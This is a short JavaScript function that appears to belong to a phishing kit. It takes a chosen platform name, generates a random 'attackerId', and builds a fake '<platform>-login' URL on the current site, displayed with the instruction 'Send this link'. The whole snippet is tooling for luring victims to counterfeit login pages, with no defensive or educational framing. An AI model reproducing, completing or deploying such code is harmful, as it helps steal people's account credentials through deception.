function generateLink() {
    const platform = document.getElementById("platform").value;
    const attackerId = Math.random().toString(36).substring(2, 15); // Random ID
    const link = `${window.location.origin}/${platform}-login/${attackerId}`;
    document.getElementById("link-output").innerHTML = `Send this link: <a href="${link}">${link}</a>`;
}